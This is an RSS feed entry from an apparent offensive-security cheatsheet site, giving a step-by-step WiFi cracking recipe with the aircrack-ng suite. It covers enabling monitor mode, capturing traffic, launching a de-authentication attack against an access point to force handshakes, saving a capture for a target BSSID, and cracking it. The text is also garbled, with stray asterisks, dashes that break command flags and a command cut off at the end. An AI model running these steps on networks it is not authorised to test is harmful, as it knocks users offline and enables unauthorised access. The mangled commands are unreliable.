channel.title: Wireless on Offensive Security Cheatsheet
channel.description: Recent content in Wireless on Offensive Security Cheatsheet

item.title: WiFi Cracking
item.description: Aircrack-NG Suite # Turning on the monitor mode # We can not see packages from SSIDs that we are not associated with airmon-ng start wlan0** # Monitoring # We capture packages running: airodump-ng mon0** # Speeding up # We can launch a de-authentication attack to speed up the process: aireplay-ng -0 3 -a <macaddress of the ap> mon0** # Capturing packages airodump-ng mon0 --bssid –c (channel) –w (file name to save)** # Cracking the cap aircrack-ng RHAWEP-0.
